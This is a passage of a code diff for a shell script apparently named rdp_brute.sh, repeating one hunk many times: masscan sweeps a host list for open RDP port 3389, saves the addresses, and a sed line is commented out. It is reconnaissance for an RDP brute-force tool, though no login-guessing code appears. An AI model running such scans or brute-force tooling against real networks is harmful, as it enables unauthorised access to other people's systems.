 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -12768,7 +12772,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -12814,7 +12818,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -12860,7 +12864,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -12906,7 +12910,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -12952,7 +12956,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -12998,7 +13002,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -13044,7 +13048,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -13090,7 +13094,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -13136,7 +13140,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -13182,7 +13186,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -13228,7 +13232,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -13274,7 +13278,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -13320,7 +13324,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -13366,7 +13370,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -13412,7 +13416,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -13458,7 +13462,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -13504,7 +13508,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -13550,7 +13554,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -13596,7 +13600,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -13642,7 +13646,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -13687,7 +13691,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -13733,7 +13737,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -13779,7 +13783,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -13825,7 +13829,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -13871,7 +13875,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -13917,7 +13921,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -13963,7 +13967,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -14009,7 +14013,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -14055,7 +14059,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -14101,7 +14105,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -14147,7 +14151,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -14193,7 +14197,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -14239,7 +14243,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -14285,7 +14289,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -14331,7 +14335,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -14377,7 +14381,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -14423,7 +14427,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -14468,7 +14472,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -14513,7 +14517,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -14559,7 +14563,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -14605,7 +14609,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -14651,7 +14655,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -14697,7 +14701,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -14743,7 +14747,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -14789,7 +14793,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -14835,7 +14839,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -14881,7 +14885,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -14927,7 +14931,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -14973,7 +14977,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -15018,7 +15022,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -15063,7 +15067,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -15109,7 +15113,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -15155,7 +15159,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -15201,7 +15205,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -15247,7 +15251,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -15293,7 +15297,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -15339,7 +15343,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -15385,7 +15389,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -15431,7 +15435,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -15477,7 +15481,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -15523,7 +15527,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -15569,7 +15573,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -15615,7 +15619,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -15661,7 +15665,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -15707,7 +15711,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -15753,7 +15757,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
